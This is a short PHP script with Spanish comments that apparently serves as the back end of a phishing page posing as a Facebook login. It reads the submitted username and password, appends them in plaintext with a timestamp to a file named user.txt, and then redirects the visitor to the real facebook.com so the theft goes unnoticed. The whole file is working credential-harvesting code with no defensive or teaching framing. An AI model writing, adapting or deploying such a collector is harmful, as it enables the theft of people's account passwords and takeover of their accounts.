<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $usuario = $_POST['usuario'] ?? '';
    $password = $_POST['password'] ?? '';

    // Formato de los datos
    $datos = "Usuario: " . $usuario .
             " | Contraseña: " . $password .
             " | Fecha: " . date("d/m/Y H:i:s") . PHP_EOL;

    // Guardar en user.txt
    file_put_contents("user.txt", $datos, FILE_APPEND);

    echo "<h2>Datos guardados correctamente.</h2>";
    echo "<p>Usuario: " . htmlspecialchars($usuario) . "</p>";
 // Redirigir a Facebook
    header("Location: https://www.facebook.com/");
    exit();
}
?>